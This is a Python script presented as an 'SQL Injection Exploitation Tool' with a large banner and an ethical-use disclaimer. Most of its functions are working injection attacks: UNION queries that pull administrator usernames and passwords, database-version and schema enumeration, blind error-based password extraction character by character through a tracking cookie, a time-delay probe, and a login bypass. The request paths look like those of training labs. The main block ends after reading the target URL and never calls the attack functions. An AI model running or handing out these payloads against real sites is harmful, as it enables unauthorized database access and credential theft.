import requests
import urllib3
import sys
import urllib.parse
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

# Tool Banner
def print_banner():
    print("""
  ████████████████████████████████████████████████████████████████████████
  ████  ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄  ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄  ▄▄▄▄▄  ▄▄▄▄▄ ▄▄▄▄▄ ████
  ████  ███████████████████████████████████████████████████████████████ ████
  ████  ████    ████ ██    ██████    ████ ████  ██    ██  ██  ████ ████
  ████  ████████████ ██████ ██ ████████ ██ ███████ ████  ██████ ████ ████
  ████  ██  ██    ████ ██ ██ ██  ██  ██    ████████████████    ██ ████ ████
  ████  ██████████████████    ████████████████████████    ██████████████ ████
  ████  ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄  ▄▄▄▄▄ ▄▄▄▄▄  ▄▄▄▄▄ ▄▄▄▄▄ ████ ██████████ ████ ████
  ████  ██████ ███████ ████ ██████████████████████ ██████████████████████
  ████ ████ 
  ████████████████████████████████████████████████████████████████████████
              ████
         ▄▄███████████████████▄
        ▄███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▄
       ▄██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▄
      ████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
      ████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
      ██████████████████████████████████
      ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
       ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
      ▀████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
       ▀████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
         ▀██████████████████████████████████▀
      
        ▄▄▄▄▄▄   ██████  ██   █████  ██████ ██    ██  ██████    ██
       █████████  ██    ██ ██  ██  ████    ██   ██   ██   ██   ██
       ██  ██ ██  ██    ██ ██  ████████   ██   ██   ██    ██   ██
       ██  ██ ██   ██████ ██ ██    ██ ██   █████████  ██   ██   ██

                        Version 2.0
              SQL Injection Exploitation Tool

       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
       ████████     Tool for Penetration Testing    ████████
       ██████ ██ ██ ██████ ██ ██ ██ ██ ██████ ████ ██ ██ ██
  ██████████████ ██ ██ ██ ██ ██ ██ ███████ ██████ ██ ██ ██
           ████ ██ ██ ██ ██ ██ ██ ██████ ████ ██ ██ ██ ██
           ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
       
      Description: 
      ██████████  ** Welcome to the SQL Injection Exploitation Tool! **  ██████████
      
      ✅ **Penetration Testing Made Easy**: This powerful tool helps ethical hackers, security researchers, and penetration testers uncover SQL injection vulnerabilities in web applications.
      
      🔍 **Discover Hidden Weaknesses**: Quickly find vulnerabilities that could potentially compromise sensitive data by exploiting SQL injection flaws.
      
      🔓 **Efficient Exploitation**: Use automated queries to extract valuable information such as usernames, passwords, and database versions, all in a streamlined workflow.
      
      ⚠️ **Ethical Use Only**: This tool is designed with responsible, ethical hacking in mind. It is intended for legal penetration testing only—always get permission before testing any system!
      
      💡 **Enhance Your Security Audits**: By automating SQL injection attacks, you can speed up your security audits and better assess the safety of your applications.

      Author: Security Analyst

      ##########  Use responsibly and ethically ##########

      DISCLAIMER: This tool is intended for ethical penetration testing only.
      Unauthorized use is illegal and unethical.
    """)


def perform_request(url, sql_payload):
    path = '/filter?category=Corporate+gifts'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text

def exploit_sqli_column_number(url):
    path = "/filter?category=Tech+%26+gifts"
    for i in range(1, 50):
        sql_payload = "'+order+by+%s--" % i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
    return None

def exploit_sqli_string_field(url, num_col):
    path = "/filter?category=Tech+%26+gifts"
    for i in range(1, num_col + 1):
        string = "'ZTazwd'"
        payload_list = ['NULL'] * num_col
        payload_list[i - 1] = string
        sql_payload = "' UNION select " + ','.join(payload_list) + "--"
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('"') in res:
            return i
    return None

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Gifts'
    sql_payload = "' UNION select username, password from users--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator password.")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
        print("Administrator Password:", admin_password)
        return True
    return False

def exploit_sqli_users_password_concat(url):
    username = 'administrator'
    path = '/filter?category=Pets'
    sql_payload = "' UNION SELECT NULL, username || '*' || password FROM users--"
    r = requests.get(url + path + sql_payload, verify=False)
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator password...")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_text = soup.find(text=re.compile('.* administrator .*'))
        if admin_text:
            admin_text = admin_text.split("*")[1]
            print("[+] The administrator password is '%s'." % admin_text)
            return True
        else:
            print("[-] Couldn't extract the administrator password.")
            return False
    return False

def exploit_sqli_version_oracle(url):
    path = "/filter?category=Gifts"
    sql_payload = "' UNION SELECT banner, NULL from v$version--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "Oracle Database" in res:
        print("[+] Found the database version.")
        soup = BeautifulSoup(res, 'html.parser')
        version = soup.find(text=re.compile(r'.*Oracle\sDatabase.*'))
        print("[+] The Oracle database version is: " + version)
        return True
    return False

def exploit_sqli_version_mysql(url):
    path = "/filter?category=Accessories"
    sql_payload = "' UNION SELECT @@version, NULL%23"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
    if version is None:
        return False
    else:
        print("[+] The database version is:" + version)
        return True

def exploit_sqli_find_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    path = '/filter?category=Accessories'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('.*users.*'))
    return users_table if users_table else None

def exploit_sqli_find_columns(url, table_name):
    sql_payload = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '%s'--" % table_name
    path = '/filter?category=Accessories'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*username.*'))
    password_column = soup.find(text=re.compile('.*password.*'))
    return username_column, password_column

def exploit_sqli_get_admin_password(url, table_name, username_column, password_column):
    sql_payload = "' UNION SELECT %s, %s FROM %s--" % (username_column, password_column, table_name)
    path = '/filter?category=Accessories'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
    return admin_password

def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):  # Adjust the range as needed
        for j in range(40, 126):
            sqli_payload = f"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password, {i}, 1) = '{chr(j)}') || '"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'uqcOPt1v4N3ogVHu' + sqli_payload_encoded, 'session': 'FDheSfoxpIBHX9ELQGUNgMi4kYczpH2O'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def blind_sqli_check(url):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': 'OVmpehhTPt2iCL19' + sqli_payload_encoded, 'session': '5K6cNIGOLXlD50C4XUZjXGJhLf3HYEY1'}
    try:
        r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        if r.status_code == 200 and r.elapsed.total_seconds() > 10:
            print("(+) Vulnerable to blind-based SQL injection")
        else:
            print("(-) Not vulnerable to blind-based SQL injection")
    except requests.exceptions.RequestException as e:
        print(f"(-) Error occurred: {e}")

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    print(csrf)
    return csrf

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf,
            "username": payload,
            "password": "randomtext"}
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False

if __name__ == "__main__":
    print_banner()
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("Usage: python script.py <URL>")
        sys.exit
